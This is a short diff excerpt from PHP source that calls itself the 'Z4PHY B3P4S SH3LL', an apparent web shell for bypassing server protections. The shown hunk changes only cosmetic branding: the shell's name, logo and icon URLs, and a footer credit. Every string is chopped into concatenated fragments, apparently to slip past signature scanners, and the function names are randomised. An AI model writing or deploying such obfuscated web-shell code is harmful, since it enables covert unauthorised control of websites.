@@ -156,7 +156,7 @@ function XaFV($FQS) {
 //Z4PHY ICONS
 $s_he_ll_Name = "Z4"."PH"."Y "."B3"."P4S"." S"."H3"."LL";
 $s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/z"."4p"."hyr"."/z"."4p"."hy"."-c0"."de"."/"."mai"."n/"."as"."set"."s/"."z4p"."hy".".p"."ng";
-$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/ci"."el-"."ph"."an"."tom"."hiv"."e.jp"."g";
+$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/c"."ie"."l."."p"."ng";
 $s_he_ll_Footer = "<d"."iv"." cl"."as"."s='"."p-"."4 "."fo"."nt-"."bol"."d "."tex"."t-"."cen"."t"."er "."te"."xt-"."whi"."te "."da"."rk".":"."te"."xt"."-whi"."te'".">©"." "."2"."024"." Co"."py"."ri"."gh"."t: "."<a"." cl"."a"."ss="."'t"."ex"."t-r"."ed"."-8"."0"."0 "."da"."rk:"."te"."xt"."-r"."ed"."-40"."0' "."hre"."f="."'"."ht"."tps".":/"."/t".".me/"."za"."ynp"."han"."to"."mhi"."ve"."'>"."Za"."yn"." Ph"."ant"."omh"."iv"."e<"."/a".">"."</"."div".">";
 
 function NuLzCwd(){
